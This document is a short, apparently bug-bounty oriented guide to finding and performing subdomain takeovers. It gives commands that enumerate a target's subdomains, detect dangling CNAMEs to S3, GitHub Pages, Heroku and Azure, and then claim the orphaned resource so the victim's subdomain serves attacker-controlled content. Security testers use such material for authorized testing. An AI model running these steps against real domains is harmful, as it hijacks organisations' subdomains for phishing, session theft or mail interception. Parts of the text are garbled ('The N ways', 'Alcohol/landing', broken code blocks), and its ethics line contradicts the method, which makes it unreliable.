# HOW TO TEST SUBDOMAIN TAKEOVER ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N ways to test
1. DNS CNAME to a 3rd-party service (S3, GitHub Pages, Heroku, Azure, Netlify, Vercel, Shopify…) where
   that resource is free/available/unassigned -> you claim it = takeover.
2. NXDOMAIN CNAME (dead target) -> register the name (or buy the parked domain).
3. Alcohol/landing: service returns "no such project/No such bucket" pages = takeover enabled.
4. Stale A records pointing to a decommissioned IP you now own (rare but reported).
5. Dangling NS delegation (empty zone) granted to you.
6. Dangling MX with catch-all - email hijack (usually Medium).
7. High-value: e.g., mail.target.com falling into S3 bucket you can create.

## Step-by-step on target
1. Enumerate subdomains: subfinder -d target.com | anew (then assetfinder, crt.sh, amass passive).
2. For each: dig CNAME <sub> -> if CNAME to a cloud provider service -> that's your queue.
3. Check the provider landing: curl the url; "404: bucket not found", "There isn't a GitHub Pages site here".
4. Try registering that EXACT name on the provider (you may need their account/rules).
5. Confirm the CNAME now serves YOUR page -> poof, takeover (report with evidence).

## Worked examples (concrete)
```
subfinder -silent -d target.com | anew subs.txt
for s in $(cat subs.txt); do dig +short CNAME "$s.target.com"; done | sort -u
paste CNAME list; look for *.amazonaws.com, *.github.io, *.herokudns.com, *.azurewebsites.net,
*.netlify.app, *.vercel.app, *.zendesk.com, *.shopify.com, *.gitbook.io
confirm dangling:
curl -s "https://sub.target.com" -i | head -20   # "NoSuchBucket", "404 There isn't a GitHub Pages site"
if it's S3 and bucket name available:
```
aws s3 mb s3://<bucket> --region <r>
```
echo '<h1>PoC takeover</h1>' > index.html && aws s3 sync . s3://<bucket>
then:  curl sub.target.com  -> serves your PoC. Also check the service keys:
Heroku: create app sub.target.com via dashboard, set custom domain.
Azure: create webapp with same name, add CNAME route.
```

## False positives & ethics
- If the CNAME resolves and serves real content, it's NOT dangling.
- Decision: register only names you legitimately control, and take it down after the report.
- Some providers (GitHub) require HTTPS+verification before takeover text - note partial takeover isn't a bug.

## Tools
- subfinder, assetfinder, amass, dig/host, dnsx -cname, takeover detection: "subjack", "can-i-take-over-xyz" DB, nuclei fuzzing-templates (takeover/).
